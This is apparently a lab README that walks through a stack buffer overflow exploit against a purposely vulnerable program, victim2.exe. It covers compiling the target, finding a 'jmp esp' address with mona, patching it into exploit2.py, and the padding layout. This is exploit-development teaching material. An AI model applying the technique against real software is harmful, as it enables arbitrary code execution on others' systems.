To run this example, download all files to a Windows folder.

## Steps to exploit victim2.exe

1. Compile victim2.c
```
gcc -m32 -o victim2.exe victim2.c
```

2. Find the address of *jmp esp* from the computer memory

Load any program into Immmunity Debugger, e.g., victim2.exe. Use mona to find the address of jmp esp
```
!mona jmp -r esp -m kernel
```
4. Replace the address of jmp esp in exploit2.py
```
payload += b"\xE4\x08\x17\x77" #Address of jmp esp found by immunity debugger. Change it after every Windows reboot
```
5. Exploit
```
python exploit2.py
```

## Notes:
In exploit2.py, when we craft the malicious string, the first 62 bytes are the padding that is used to overwrite the stack from the local buffer *str* to the return address of the *main* function. The stack layout below shows why 62 bytes of padding are needed.

```
                                  High address
        +----------------------+  
        |                      |
        +----------------------+
        |                      |
        .                      .              -------------
        |      shellcode       |  4 bytes     |            |     
        +----------------------+         <-----     -------|---
        |    return address    |  4 bytes   ------> | jmp esp |
        +----------------------+                    -----------
        |      old ebp         |  4 bytes
EBP ->  +----------------------+
        |                      |  4 bytes
        +----------------------+
        |                      |  4 bytes
        +----------------------+    ---
        |                      |  
        .                      .  50 (32h) bytes
        |                      |     
        +----------------------+    --- 
                                  Low address
```
